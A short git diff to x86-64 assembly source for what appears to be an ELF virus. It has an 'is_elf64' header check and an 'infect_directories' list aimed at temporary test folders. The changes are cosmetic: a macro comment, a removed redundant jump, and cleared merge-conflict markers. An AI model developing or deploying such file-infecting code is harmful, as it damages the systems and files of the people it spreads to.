@@ -5,6 +5,7 @@ section .text
 %define TRUE    1
 %define FALSE   0
 
+; log ptr, len
 %macro log 2
 %ifdef DEBUG
     push rax
@@ -320,7 +321,6 @@ is_elf64:
     jnz .return
     mov rdx, ELF64_E_IDENT_LSB
     cmp QWORD [rdi], rdx
-    jz .continue
    .continue:
         mov rdx, ELF64_E_IDENT_MSB_ET_DYN
         cmp QWORD [rdi + 16], rdx
@@ -497,10 +497,6 @@ exit:
     mov rax, SYS_EXIT
     xor rdi, rdi
     syscall
-<<<<<<< HEAD
-=======
-; exit
->>>>>>> @{-1}
 
 infect_directories:
     dq tmp_test, tmp_test2, 0
